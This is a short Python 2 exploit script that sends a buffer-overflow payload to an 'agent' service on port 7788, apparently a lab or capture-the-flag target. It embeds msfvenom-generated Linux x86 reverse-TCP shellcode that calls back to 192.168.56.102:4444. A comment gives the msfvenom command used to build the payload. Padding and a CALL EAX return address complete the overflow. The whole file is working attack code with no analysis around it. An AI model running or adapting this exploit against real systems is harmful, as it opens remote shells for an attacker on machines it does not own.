#!/usr/bin/python
import time, struct, sys
import socket as so

#Command used for Linux Payload.. replace with your IP - msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=192.168.56.102 -b "\x00\x0a\x0d" -f py

buf =  ""
buf += "\xda\xca\xd9\x74\x24\xf4\xbe\x21\x42\x7a\x9f\x5b\x29"
buf += "\xc9\xb1\x12\x83\xeb\xfc\x31\x73\x13\x03\x52\x51\x98"
buf += "\x6a\xa5\x8e\xab\x76\x96\x73\x07\x13\x1a\xfd\x46\x53"
buf += "\x7c\x30\x08\x07\xd9\x7a\x36\xe5\x59\x33\x30\x0c\x31"
buf += "\x04\x6a\xd6\xa7\xec\x69\x27\x36\xb0\xe4\xc6\x88\x2c"
buf += "\xa7\x59\xbb\x03\x44\xd3\xda\xa9\xcb\xb1\x74\x5c\xe3"
buf += "\x46\xec\xc8\xd4\x87\x8e\x61\xa2\x3b\x1c\x21\x3d\x5a"
buf += "\x10\xce\xf0\x1d"

#CALL EAX address is 8048563
buf += "A" * (168 - len(buf))

buf +="\x63\x85\x04\x08\n"

try:
   server = str(sys.argv[1])
   port = int(sys.argv[2])
except IndexError:
   print "[+] Usage example: python %s 192.168.56.103 7788" % sys.argv[0]
   sys.exit()

#Automatically connects to agent binary, enters the Agent ID number, and sends malicious payload using option 3.
s = so.socket(so.AF_INET, so.SOCK_STREAM)   
print "\n[+] Attempting to send buffer overflow to agent...."
try: 
   s.connect((server,port))
   s.recv(1024)
   s.send("48093572\n")
   s.recv(1024)
   s.send("3\n")
   s.send(buf)
   s.recv(1024)
   print "\n[+] Completed."
except:
   print "[+] Unable to connect to agent over port 7788. Check your IP address and port. Make sure 7788 is really open."
   sys.exit()
